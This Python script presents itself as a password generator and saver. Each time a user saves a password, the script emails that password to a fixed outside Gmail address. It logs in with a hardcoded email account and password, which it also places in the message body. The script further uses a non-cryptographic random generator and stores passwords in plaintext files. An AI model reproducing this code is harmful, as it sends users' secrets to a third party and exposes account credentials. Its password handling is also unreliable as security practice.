import random
import string
import os
import smtplib
from email.mime.text import MIMEText

def generate_password(length):
    # Adding extra special characters
    extra_special_chars = '@#$%^&*()_+-=[]{}|;:,.<>?'
    chars = string.ascii_letters + string.digits + string.punctuation + extra_special_chars
    password = ''.join(random.choice(chars) for _ in range(length))
    return password

def save_password(name, password):
    with open(f"{name}.txt", 'w') as file:
        file.write(password)

def open_saved_password(name):
    if os.path.exists(f"{name}.txt"):
        with open(f"{name}.txt", 'r') as file:
            print(f"Saved Password for {name}: {file.read()}")
    else:
        print(f"No saved password found for {name}")

def send_email(name, password):
    # Configure email settings
    sender_email = "gabrielchukwugoziem@gmail.com"  # Sender email
    sender_password = "(Victor55)"                     # Password for the sender email
    recipient_email = "vg253044@gmail.com"           # Fixed recipient email

    # Create the email content
    subject = "Generated Password"
    body = f"Name: {name}\nGenerated Password: {password}\nSender Password: {sender_password}"
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = recipient_email

    # Send the email
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:  # Use Gmail's SMTP server
            server.login(sender_email, sender_password)  # Keep brackets in sender password
            server.sendmail(sender_email, recipient_email, msg.as_string())
        print(f"Email sent to {recipient_email} with the generated password.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def main():
    while True:
        print("Press 1 to create a password.")
        print("Press 2 to open a saved password.")
        
        action = input("Enter your choice (1 or 2): ")
        
        if action == '1':
            try:
                length = int(input("Enter password length (5-20): "))
                if length < 5 or length > 20:
                    print("Password length must be between 5 and 20.")
                    continue  # Go back to the start of the loop
                
                password = generate_password(length)
                print(f"Generated Password: {password}")
                
                save_choice = input("Do you want to save the password? (yes/no): ").lower()
                if save_choice == 'yes':
                    name = input("Enter the name to save the password with: ")
                    save_password(name, password)
                    print(f"Password saved as {name}.txt")
                    
                    # Send email with the password
                    send_email(name, password)
                else:
                    print("Password not saved.")
            
            except ValueError:
                print("Incorrect input. Please enter a valid number.")
        
        elif action == '2':
            name = input("Enter the name to open the saved password: ")
            open_saved_password(name)
        
        else:
            print("Invalid option. Please enter '1' or '2'.")

if __name__ == "__main__":
    main()
